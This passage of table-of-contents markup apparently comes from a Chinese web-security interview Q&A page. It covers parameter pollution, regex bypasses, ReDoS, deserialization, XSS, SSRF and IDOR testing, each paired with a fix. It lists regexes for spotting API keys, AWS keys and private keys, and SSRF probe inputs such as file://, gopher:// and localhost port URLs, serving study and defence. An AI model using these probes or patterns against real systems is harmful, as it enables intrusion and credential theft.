href="#%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87-HTTP-%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E5%B0%86-uid-9527-amount-100-%E4%B8%AD%E7%9A%84-uid-%E6%94%B9%E4%B8%BA-10086%EF%BC%9F"><span class="toc-number">18.1.</span> <span class="toc-text">如何通过 HTTP 参数污染将 uid&#x3D;9527&amp;amount&#x3D;100 中的 uid 改为 10086？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E4%B8%A5%E6%A0%BC%E9%99%90%E5%88%B6%E5%8F%82%E6%95%B0%E6%A0%BC%E5%BC%8F%EF%BC%8C%E6%8B%92%E7%BB%9D%E9%87%8D%E5%A4%8D%E5%8F%82%E6%95%B0%E3%80%82-%E7%BB%9F%E4%B8%80%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%8F%82%E6%95%B0%E8%A7%A3%E6%9E%90%E6%96%B9%E5%BC%8F%EF%BC%8C%E7%A1%AE%E4%BF%9D%E5%8F%82%E6%95%B0%E5%94%AF%E4%B8%80%E6%80%A7%E3%80%82"><span class="toc-number">19.</span> <span class="toc-text">修复方案：- 严格限制参数格式，拒绝重复参数。- 统一服务器端参数解析方式，确保参数唯一性。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%93%E7%BD%91%E5%85%B3%E5%AF%B9%E6%89%80%E6%9C%89%E8%AF%B7%E6%B1%82%E4%BC%9A%E8%BF%9B%E8%A1%8C%E4%B8%80%E6%AC%A1%E5%BC%BA%E5%88%B6-urldecode%EF%BC%8C%E5%AD%98%E5%9C%A8%E4%B8%80%E4%B8%AA%E5%8F%82%E6%95%B0-uid-9527-remark-%E5%85%85%E8%AF%9D%E8%B4%B9-amount-100-%E7%9A%84%E6%8E%A5%E5%8F%A3%EF%BC%8C%E4%BB%85%E5%A4%87%E6%B3%A8%E5%AD%97%E6%AE%B5%EF%BC%88remark%EF%BC%89%E5%8F%AF%E6%8E%A7%E6%97%B6%EF%BC%8C%E5%A6%82%E4%BD%95%E6%94%B9%E5%8F%98%E6%9C%80%E7%BB%88%E7%9A%84%E9%87%91%E9%A2%9D%E5%AD%97%E6%AE%B5%EF%BC%88amount%EF%BC%89%EF%BC%9F"><span class="toc-number">19.1.</span> <span class="toc-text">当网关对所有请求会进行一次强制 urldecode，存在一个参数 uid&#x3D;9527&amp;remark&#x3D;充话费&amp;amount&#x3D;100 的接口，仅备注字段（remark）可控时，如何改变最终的金额字段（amount）？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E5%AF%B9%E8%BE%93%E5%85%A5%E6%95%B0%E6%8D%AE%E8%BF%9B%E8%A1%8C%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E6%A3%80%E6%9F%A5%EF%BC%8C%E9%81%BF%E5%85%8D-urldecode-%E8%A7%A3%E6%9E%90%E5%8F%82%E6%95%B0%E3%80%82-%E4%BD%BF%E7%94%A8-JSON-%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE%EF%BC%8C%E9%81%BF%E5%85%8D-query-string-%E5%8F%82%E6%95%B0%E8%A7%A3%E6%9E%90%E9%97%AE%E9%A2%98%E3%80%82"><span class="toc-number">20.</span> <span class="toc-text">修复方案：- 对输入数据进行二次编码检查，避免 urldecode 解析参数。- 使用 JSON 传输数据，避免 query string 参数解析问题。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%AA%E4%BA%9B%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%B5%8B%E8%AF%95%E5%AF%B9%E4%B8%9A%E5%8A%A1%E6%9C%89%E6%8D%9F%EF%BC%9F%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%EF%BC%9F"><span class="toc-number">20.1.</span> <span class="toc-text">哪些漏洞的测试对业务有损？如何避免？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%81%BF%E5%85%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E5%9C%A8-%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83-%E8%BF%9B%E8%A1%8C%E9%AA%8C%E8%AF%81%EF%BC%8C%E9%81%BF%E5%85%8D%E7%9B%B4%E6%8E%A5%E5%9C%A8%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E6%B5%8B%E8%AF%95%E3%80%82-%E5%AF%B9%E5%85%B3%E9%94%AE-API-%E9%99%90%E5%88%B6%E9%AB%98%E9%A2%91%E8%AF%B7%E6%B1%82%EF%BC%8C%E9%98%B2%E6%AD%A2%E5%BD%B1%E5%93%8D%E7%94%A8%E6%88%B7%E4%BD%93%E9%AA%8C%E3%80%82"><span class="toc-number">21.</span> <span class="toc-text">避免方案：- 在 测试环境 进行验证，避免直接在生产环境测试。- 对关键 API 限制高频请求，防止影响用户体验。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E4%B8%80%E8%88%AC%E5%88%86%E4%B8%BA%E5%93%AA%E5%87%A0%E4%B8%AA%E6%AD%A5%E9%AA%A4%EF%BC%9F"><span class="toc-number">21.1.</span> <span class="toc-text">漏洞修复一般分为哪几个步骤？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%B6%E5%AE%9A%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BF%AE%E5%A4%8D%E6%97%B6%E9%97%B4%EF%BC%9F%E9%9C%80%E8%A6%81%E8%80%83%E8%99%91%E5%93%AA%E4%BA%9B%E5%9B%A0%E7%B4%A0%EF%BC%9F"><span class="toc-number">21.2.</span> <span class="toc-text">如何制定漏洞的修复时间？需要考虑哪些因素？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5%EF%BC%9A-P0%EF%BC%88%E9%AB%98%E5%8D%B1%EF%BC%89%EF%BC%9A24-%E5%B0%8F%E6%97%B6%E5%86%85%E4%BF%AE%E5%A4%8D%E3%80%82-P1%EF%BC%88%E4%B8%AD%E5%8D%B1%EF%BC%89%EF%BC%9A1-%E5%91%A8%E5%86%85%E4%BF%AE%E5%A4%8D%E3%80%82-P2%EF%BC%88%E4%BD%8E%E5%8D%B1%EF%BC%89%EF%BC%9A1-%E4%B8%AA%E6%9C%88%E5%86%85%E4%BF%AE%E5%A4%8D%E3%80%82"><span class="toc-number">22.</span> <span class="toc-text">最佳实践：- P0（高危）：24 小时内修复。- P1（中危）：1 周内修复。- P2（低危）：1 个月内修复。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%9C%89%E6%95%88%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%95%88%E7%8E%87%EF%BC%9F"><span class="toc-number">22.1.</span> <span class="toc-text">如何有效提升漏洞修复效率？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%98%E5%8C%96%E6%96%B9%E6%B3%95%EF%BC%9A-%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB%EF%BC%8C%E5%88%B6%E5%AE%9A%E6%A0%87%E5%87%86%E5%8C%96%E4%BF%AE%E5%A4%8D%E6%B5%81%E7%A8%8B%E3%80%82-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%EF%BC%8C%E5%87%8F%E5%B0%91%E5%9B%9E%E5%BD%92%E6%B5%8B%E8%AF%95%E6%88%90%E6%9C%AC%E3%80%82-%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD%EF%BC%8C%E6%8F%90%E9%AB%98%E4%BF%AE%E5%A4%8D%E8%83%BD%E5%8A%9B%E3%80%82"><span class="toc-number">23.</span> <span class="toc-text">优化方法：- 漏洞分类，制定标准化修复流程。- 自动化测试，减少回归测试成本。- 开发安全培训，提高修复能力。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E6%98%AF%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%97%A0%E6%B3%95%E5%87%86%E7%A1%AE%E5%88%A4%E6%96%AD%E5%AD%98%E5%9C%A8%E4%B8%8E%E5%90%A6%E7%9A%84%EF%BC%9F"><span class="toc-number">23.1.</span> <span class="toc-text">什么类型漏洞是代码审计无法准确判断存在与否的？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%EF%BC%9A-%E7%BB%93%E5%90%88%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%EF%BC%88DAST%EF%BC%89-%E4%BA%BA%E5%B7%A5%E6%B5%8B%E8%AF%95%EF%BC%8C%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E%E6%98%AF%E5%90%A6%E5%8F%AF%E8%A2%AB%E5%88%A9%E7%94%A8%E3%80%82"><span class="toc-number">24.</span> <span class="toc-text">解决方案：- 结合动态分析（DAST）+人工测试，验证漏洞是否可被利用。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E9%92%A5%E7%9A%84%E8%AF%86%E5%88%AB%E7%9A%84%E6%AD%A3%E5%88%99%E5%A6%82%E4%BD%95%E5%86%99%EF%BC%9F"><span class="toc-number">24.1.</span> <span class="toc-text">密钥的识别的正则如何写？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%B9%E9%85%8D-API-Key%E3%80%81JWT%E3%80%81OAuth-Token%EF%BC%9A-i-apikey-token-secret-password-bearer-s-s-A-Za-z0-9-20-60-%E5%8C%B9%E9%85%8D-AWS-%E8%AE%BF%E9%97%AE%E5%AF%86%E9%92%A5%EF%BC%9AAKIA-0-9A-Z-16-%E5%8C%B9%E9%85%8D%E7%A7%81%E9%92%A5%EF%BC%9A-BEGIN-RSA-DSA-EC-PRIVATE-KEY-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E7%A6%81%E6%AD%A2%E5%AF%86%E9%92%A5%E7%A1%AC%E7%BC%96%E7%A0%81%EF%BC%8C%E4%BD%BF%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%88%96%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E5%AD%98%E5%82%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E3%80%82"><span class="toc-number">25.</span> <span class="toc-text">匹配 API Key、JWT、OAuth Token：(?i)(apikey|token|secret|password|bearer)\s*[:&#x3D;]\s*[&quot;&#39;]?([A-Za-z0-9\-_]{20,60})[&quot;&#39;]?匹配 AWS 访问密钥：AKIA[0-9A-Z]{16}匹配私钥：-----BEGIN (RSA|DSA|EC) PRIVATE KEY-----修复方案：- 禁止密钥硬编码，使用环境变量或配置管理工具存储敏感信息。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%88%99-a-%E4%BC%9A%E5%AD%98%E5%9C%A8%E5%93%AA%E4%BA%9B%E9%A3%8E%E9%99%A9%EF%BC%9F"><span class="toc-number">25.1.</span> <span class="toc-text">正则 (a+)+ 会存在哪些风险？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E9%81%BF%E5%85%8D%E4%BD%BF%E7%94%A8%E5%B5%8C%E5%A5%97%E9%87%8D%E5%A4%8D%E5%8C%B9%E9%85%8D-a-%EF%BC%8C%E6%94%B9%E7%94%A8-a-%E9%99%90%E5%88%B6%E5%8C%B9%E9%85%8D%E8%8C%83%E5%9B%B4%E3%80%82-%E4%BD%BF%E7%94%A8%E9%9D%9E%E5%9B%9E%E6%BA%AF%E6%AD%A3%E5%88%99%EF%BC%88%E5%A6%82-RE2-%E5%BC%95%E6%93%8E%EF%BC%89%E3%80%82"><span class="toc-number">26.</span> <span class="toc-text">修复方案：- 避免使用嵌套重复匹配 (a+)+，改用 ^a+$ 限制匹配范围。- 使用非回溯正则（如 RE2 引擎）。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%AF%B9%E8%AF%BB%E5%8F%96%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8D%E7%9A%84%E6%AD%A3%E5%88%99%E4%B8%BA-markdown-%EF%BC%8C%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%EF%BC%9F"><span class="toc-number">26.1.</span> <span class="toc-text">程序对读取的文件名的正则为 &#x2F;\.markdown&#x2F;，如何绕过？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E4%B8%A5%E6%A0%BC%E4%BD%BF%E7%94%A8-basename-%E8%A7%A3%E6%9E%90%E8%B7%AF%E5%BE%84%EF%BC%9A"><span class="toc-number">27.</span> <span class="toc-text">修复方案：- 严格使用 basename 解析路径：  1234import osfilename &#x3D; os.path.basename(user_input)if not filename.endswith(&quot;.markdown&quot;):    raise Exception(&quot;Invalid file type&quot;)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%AF%B9%E8%AF%B7%E6%B1%82%E7%9A%84-URL-%E7%9A%84%E6%AD%A3%E5%88%99%E4%B8%BA-http-feei-cn-%EF%BC%8C%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%EF%BC%9F"><span class="toc-number">27.1.</span> <span class="toc-text">程序对请求的 URL 的正则为 &#x2F;^http\:\&#x2F;\&#x2F;.*\.feei.cn($|\(\&#x2F;[^&lt;&gt;\&quot;&quot;]*\))&#x2F;，如何绕过？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E4%B8%A5%E6%A0%BC%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8D%EF%BC%8C%E4%B8%8D%E4%BE%9D%E8%B5%96%E6%AD%A3%E5%88%99%EF%BC%9A"><span class="toc-number">28.</span> <span class="toc-text">修复方案：- 严格解析域名，不依赖正则：  12345from urllib.parse import urlparsedef validate_url(url):    parsed &#x3D; urlparse(url)    if not parsed.netloc.endswith(&quot;.feei.cn&quot;):        raise ValueError(&quot;Invalid domain&quot;)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A%E5%9E%8B%E8%AF%AD%E8%A8%80%E5%92%8C%E7%BC%96%E8%AF%91%E5%9E%8B%E8%AF%AD%E8%A8%80%E5%9C%A8%E8%AF%AD%E6%B3%95%E6%A0%91%E5%88%86%E6%9E%90%E4%B8%8A%E6%9C%89%E4%BB%80%E4%B9%88%E5%B7%AE%E5%BC%82%EF%BC%9F"><span class="toc-number">28.1.</span> <span class="toc-text">解释型语言和编译型语言在语法树分析上有什么差异？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E5%9E%8B%E8%AF%AD%E8%A8%80%EF%BC%88%E5%A6%82-C%E3%80%81Java%EF%BC%89%EF%BC%9A-%E7%B1%BB%E5%9E%8B%E7%A1%AE%E5%AE%9A%EF%BC%9A%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B%E5%9C%A8%E7%BC%96%E8%AF%91%E6%9C%9F%E5%B7%B2%E7%A1%AE%E5%AE%9A%EF%BC%8C%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E6%9B%B4%E7%A8%B3%E5%AE%9A%E3%80%82-%E4%BC%98%E5%8C%96%E5%8F%AF%E8%83%BD%E5%BD%B1%E5%93%8D%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A%E7%BC%96%E8%AF%91%E5%99%A8%E4%BC%98%E5%8C%96%E5%8F%AF%E8%83%BD%E5%AF%BC%E8%87%B4%E6%9F%90%E4%BA%9B%E6%BC%8F%E6%B4%9E%E9%9A%BE%E4%BB%A5%E8%A2%AB%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%8F%91%E7%8E%B0%E3%80%82"><span class="toc-number">29.</span> <span class="toc-text">编译型语言（如 C、Java）：- 类型确定：变量类型在编译期已确定，静态分析更稳定。- 优化可能影响漏洞分析：编译器优化可能导致某些漏洞难以被静态分析发现。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-Web-%E5%BA%94%E7%94%A8%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84-Source-%E5%92%8C-Sink-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">29.1.</span> <span class="toc-text">Java Web 应用中的反序列化漏洞的 Source 和 Sink 是什么？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E7%A6%81%E7%94%A8%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84-readObject-%EF%BC%9A-%E4%BB%85%E5%85%81%E8%AE%B8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%AF%E4%BF%A1%E7%B1%BB%E5%9E%8B%EF%BC%9A"><span class="toc-number">30.</span> <span class="toc-text">修复方案：- 禁用不安全的 readObject()：  123protected Object readObject(ObjectInputStream in) throws InvalidObjectException {    throw new InvalidObjectException(&quot;Deserialization not allowed&quot;);}- 仅允许反序列化可信类型：  1234ObjectInputFilter filter &#x3D; info -&gt;     info.serialClass() !&#x3D; null &amp;&amp; allowedClasses.contains(info.serialClass());ObjectInputStream ois &#x3D; new ObjectInputStream(in);ois.setObjectInputFilter(filter);</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%91%E7%9B%92%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B-XSS-%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-number">30.1.</span> <span class="toc-text">黑盒如何检测 XSS 漏洞？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E4%BD%BF%E7%94%A8-Content-Security-Policy-%E9%99%90%E5%88%B6-JavaScript-%E6%89%A7%E8%A1%8C%E6%9D%A5%E6%BA%90%E3%80%82-%E9%87%87%E7%94%A8-encodeURIComponent-%E5%AF%B9%E8%BE%93%E5%85%A5%E6%95%B0%E6%8D%AE%E8%BF%9B%E8%A1%8C%E8%BD%AC%E4%B9%89%E3%80%82"><span class="toc-number">31.</span> <span class="toc-text">修复方案：- 使用 Content-Security-Policy 限制 JavaScript 执行来源。- 采用 encodeURIComponent() 对输入数据进行转义。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%B2%E6%96%B9%E9%BB%91%E7%9B%92%E6%98%AF%E5%90%A6%E5%BA%94%E5%85%B7%E5%A4%87%E7%88%AC%E5%8F%96%E6%B5%81%E9%87%8F%E5%8A%9F%E8%83%BD%EF%BC%9F"><span class="toc-number">31.0.1.</span> <span class="toc-text">甲方黑盒是否应具备爬取流量功能？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%98%E4%B8%AD%E6%96%B9%E6%A1%88%EF%BC%9A-%E5%85%81%E8%AE%B8%E5%9F%BA%E4%BA%8E%E6%8E%88%E6%9D%83%E7%9A%84%E7%88%AC%E5%8F%96%EF%BC%8C%E5%B9%B6%E6%8F%90%E4%BE%9B%E6%B5%81%E9%87%8F%E7%99%BD%E5%90%8D%E5%8D%95%E6%9C%BA%E5%88%B6%E3%80%82-%E7%BB%93%E5%90%88-Web-%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E8%BF%9B%E8%A1%8C%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F%E3%80%82"><span class="toc-number">32.</span> <span class="toc-text">折中方案：- 允许基于授权的爬取，并提供流量白名单机制。- 结合 Web 日志和流量分析进行被动扫描。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E7%9B%92%E5%A6%82%E4%BD%95%E6%89%AB%E6%8F%8F%E6%97%A0%E6%B3%95%E5%87%BA%E7%BD%91%E7%9A%84-SSRF%EF%BC%9F"><span class="toc-number">32.0.1.</span> <span class="toc-text">黑盒如何扫描无法出网的 SSRF？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%EF%BC%9A1-%E6%9C%AC%E5%9C%B0%E6%8E%A2%E6%B5%8B%EF%BC%9A-%E9%80%9A%E8%BF%87-file-%E3%80%81gopher-%E8%AE%BF%E9%97%AE%E6%9C%AC%E5%9C%B0%E8%B5%84%E6%BA%90%EF%BC%8C%E6%B5%8B%E8%AF%95%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%98%AF%E5%90%A6%E6%94%AF%E6%8C%81%E9%9D%9E-HTTP-%E8%AF%B7%E6%B1%82%E3%80%82-%E4%BD%BF%E7%94%A8-http-127-0-0-1-8000-admin-%E6%B5%8B%E8%AF%95%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE%E3%80%822-DNSLog%EF%BC%9A-%E5%9C%A8%E5%86%85%E7%BD%91%E9%83%A8%E7%BD%B2-DNS-%E7%9B%91%E5%90%AC%E6%9C%8D%E5%8A%A1%EF%BC%8C%E6%A3%80%E6%B5%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%98%AF%E5%90%A6%E5%B0%9D%E8%AF%95%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8D%EF%BC%9A-3-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%EF%BC%9A-%E9%80%9A%E8%BF%87-http-127-0-0-1-22%E3%80%81http-localhost-3306-%E5%8F%91%E7%8E%B0%E5%86%85%E9%83%A8%E6%9C%8D%E5%8A%A1%E3%80%82-%E7%BB%93%E5%90%88-burp-collaborator-%E8%BF%9B%E8%A1%8C-OOB-%E6%B5%8B%E8%AF%95%E3%80%82%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E9%99%90%E5%88%B6%E5%A4%96%E9%83%A8%E8%AF%B7%E6%B1%82%E7%9A%84%E7%9B%AE%E6%A0%87-IP%EF%BC%8C%E4%BB%85%E5%85%81%E8%AE%B8%E5%8F%AF%E4%BF%A1%E5%9F%9F%E5%90%8D%E8%AE%BF%E9%97%AE%E3%80%82-%E5%85%B3%E9%97%AD-gopher-%E3%80%81file-%E7%AD%89%E4%B8%8D%E5%BF%85%E8%A6%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E6%94%AF%E6%8C%81%E3%80%82"><span class="toc-number">33.</span> <span class="toc-text">方法：1. 本地探测：   - 通过 file:&#x2F;&#x2F;、gopher:&#x2F;&#x2F; 访问本地资源，测试服务器是否支持非 HTTP 请求。   - 使用 http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;admin 测试内网访问。2. DNSLog：   - 在内网部署 DNS 监听服务，检测服务器是否尝试解析域名：     1dig @127.0.0.1 example.com3. 端口扫描：   - 通过 http:&#x2F;&#x2F;127.0.0.1:22、http:&#x2F;&#x2F;localhost:3306 发现内部服务。   - 结合 burp-collaborator 进行 OOB 测试。修复方案：- 限制外部请求的目标 IP，仅允许可信域名访问。- 关闭 gopher:&#x2F;&#x2F;、file:&#x2F;&#x2F; 等不必要的协议支持。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E7%9B%92%E5%A6%82%E4%BD%95%E6%89%AB%E6%8F%8F%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-number">33.0.1.</span> <span class="toc-text">黑盒如何扫描越权漏洞？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%EF%BC%9A1-%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%E6%B5%8B%E8%AF%95%EF%BC%9A-%E7%94%A8%E6%88%B7-A-%E8%AE%BF%E9%97%AE%E7%94%A8%E6%88%B7-B-%E6%95%B0%E6%8D%AE%EF%BC%9A-%E6%9B%BF%E6%8D%A2-UID-%E8%A7%82%E5%AF%9F%E8%BF%94%E5%9B%9E%E6%95%B0%E6%8D%AE%E6%98%AF%E5%90%A6%E5%8F%AF%E8%AE%BF%E9%97%AE%E3%80%822-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E6%B5%8B%E8%AF%95%EF%BC%9A-%E4%BD%8E%E6%9D%83%E9%99%90%E7%94%A8%E6%88%B7%E5%B0%9D%E8%AF%95%E8%AE%BF%E9%97%AE%E7%AE%A1%E7%90%86%E5%91%98%E6%8E%A5%E5%8F%A3%EF%BC%9A-%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E8%BF%94%E5%9B%9E-403%EF%BC%8C%E6%88%96%E5%B0%9D%E8%AF%95%E4%B8%8D%E5%90%8C%E8%A7%92%E8%89%B2%E8%AE%BF%E9%97%AE%E3%80%823-Token-%E6%9B%BF%E6%8D%A2%EF%BC%9A-%E4%BD%BF%E7%94%A8%E5%B7%B2%E7%99%BB%E5%BD%95%E7%94%A8%E6%88%B7%E7%9A%84-JWT%E3%80%81Cookie%EF%BC%8C%E5%88%87%E6%8D%A2%E8%BA%AB%E4%BB%BD%EF%BC%8C%E8%A7%82%E5%AF%9F%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6%E6%83%85%E5%86%B5%E3%80%82%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E9%87%87%E7%94%A8-RBAC%EF%BC%88%E5%9F%BA%E4%BA%8E%E8%A7%92%E8%89%B2%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%EF%BC%89%EF%BC%8C%E9%81%BF%E5%85%8D-IDOR%EF%BC%88%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E7%9B%B4%E6%8E%A5%E5%AF%B9%E8%B1%A1%E5%BC%95%E7%94%A8%EF%BC%89%E3%80%82-%E5%9C%A8%E5%90%8E%E7%AB%AF%E6%A0%A1%E9%AA%8C%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%EF%BC%8C%E8%80%8C%E9%9D%9E%E4%BB%85%E4%BE%9D%E8%B5%96%E5%89%8D%E7%AB%AF%E9%80%BB%E8%BE%91%E3%80%82"><span class="toc-number">34.</span> <span class="toc-text">方法：1. 水平越权测试：   - 用户 A 访问用户 B 数据：     1GET &#x2F;user&#x2F;profile?uid&#x3D;10086     - 替换 UID 观察返回数据是否可访问。2. 垂直越权测试：   - 低权限用户尝试访问管理员接口：     1GET &#x2F;admin&#x2F;dashboard     - 检查是否返回 403，或尝试不同角色访问。3. Token 替换：   - 使用已登录用户的 JWT、Cookie，切换身份，观察权限控制情况。修复方案：- 采用 RBAC（基于角色的访问控制），避免 IDOR（不安全的直接对象引用）。- 在后端校验用户权限，而非仅依赖前端逻辑。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E7%9B%92%E5%B8%A6%E7%99%BB%E5%BD%95%E6%80%81%E6%89%AB%E6%8F%8F%E5%A6%82%E4%BD%95%E8%A7%84%E9%81%BF%E4%B8%9A%E5%8A%A1%E5%BD%B1%E5%93%8D%EF%BC%9F"><span class="toc-number">34.0.1.</span> <span class="toc-text">黑盒带登录态扫描如何规避业务影响？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E4%BD%BF%E7%94%A8-WAF-%E8%A7%84%E5%88%99-%E9%99%90%E5%88%B6%E9%AB%98%E9%A2%91%E5%BC%82%E5%B8%B8%E8%AF%B7%E6%B1%82%E3%80%82-%E9%87%87%E7%94%A8-%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%EF%BC%8C%E9%81%BF%E5%85%8D%E5%9C%A8%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E7%9B%B4%E6%8E%A5%E6%89%AB%E6%8F%8F%E3%80%82"><span class="toc-number">35.</span> <span class="toc-text">修复方案：- 使用 WAF 规则 限制高频异常请求。- 采用 测试环境，避免在生产环境直接扫描。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E7%9B%92%E6%89%AB%E6%8F%8F%E6%97%B6%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%E8%A2%AB%E5%8F%8D%E5%88%B6%EF%BC%9F"><span class="toc-number">35.0.1.</span> <span 